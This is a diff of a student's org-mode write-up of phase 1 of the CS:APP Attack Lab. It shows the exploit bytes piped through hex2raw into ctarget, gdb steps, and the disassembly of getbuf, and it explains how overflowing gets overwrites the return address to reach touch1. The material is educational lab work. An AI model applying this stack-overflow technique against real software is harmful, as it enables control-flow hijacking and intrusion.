@@ -2,7 +2,8 @@
 You need to redirect the program to execute a procedure that already
 exists.
 
-~getbuf~ is called by ~test~:
+~getbuf~ (the function that introduces the vulnerability by using
+~get~) is called by ~test~:
 #+begin_src c
   void test()
   {
@@ -12,8 +13,9 @@ exists.
   }
 #+end_src
 
-The task consists in getting CTARGET executing touch1 when getbuf
-executes its return statement (rather than returning to ~test~).
+The task consists in getting ~ctarget~ to execute ~touch1~ when
+~getbuf~ executes its return statement (rather than returning to
+~test~).
 
 #+begin_src c
   void touch1()
@@ -25,10 +27,9 @@ executes its return statement (rather than returning to ~test~).
   }
 #+end_src
 
-This is the address of touch1: ~00000000004017c0~.
-
-Without looking at the code further, I've added to it 8 bytes of 0s at
-a time and tried to see whether it worked. After six attempt it
+This is the address of touch1: ~00000000004017c0~.  Without looking at
+the code further, I've started to add bytes of 0s in front of that
+address and tried to whether it worked. After five attempts it
 worked. (I've also sorted the bytes so that they are in little
 endian.)
 
@@ -44,9 +45,50 @@ c0 17 40 00 00 00 00 00" | ./hex2raw | ./ctarget -q
 
 (
 to run gdb:
-- first execute ~gdb ./ctarget~
+- dump the raw data into a file:
+  #+begin_src shell
+    echo "00 00 00 00 00 00 00 00 \
+    00 00 00 00 00 00 00 00 \
+    00 00 00 00 00 00 00 00 \
+    00 00 00 00 00 00 00 00 \
+    00 00 00 00 00 00 00 00 \
+    c0 17 40 00 00 00 00 00" | ./hex2raw > raw_input
+  #+end_src
+- xecute ~gdb ./ctarget~
 - set your initial breakpoints
 - execute the command ~run -q < raw_input~
 (See
 https://stackoverflow.com/questions/455544/how-to-load-program-reading-stdin-and-taking-parameters-in-gdb)
 )
+
+Explanation: this is the assembly code for ~getbuf~:
+
+#+begin_src asm
+00000000004017a8 <getbuf>:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp
+  4017bd:	c3                   	ret
+  4017be:	90                   	nop
+  4017bf:	90                   	nop
+#+end_src
+
+As soon as execution enters ~getbuf~ (before executing ~sub
+$0x28,%rsp~), ~%rsp~ points to --- that is, at the top of the stack
+there is --- the address of the instruction which must be executed
+when ~getbuf~ terminates (which happens to be ~0x0000000000401976~).
+That is the value we need to change.
+
+We can see that the first thing ~getbuf~ does is to allocate 40 bytes
+in its stack frame (by decreasing the value of ~%rsp~ by 40).
+
+Then ~gets~ is called. The first argument passed to ~gets~ is the
+value of ~%rsp~. We can then reasonably guess that ~gets~ is going to
+write the input it receives onto the stack, starting from its top
+(lowest address).
+
+Now if we pass to ~gets~ 40 bytes of zeros (or whatever values) + an
+address of 8 bytes, then we should fill the whole 40 bytes allocated
+by ~gets~ and overwrite ~0x0000000000401976~ with our new address.
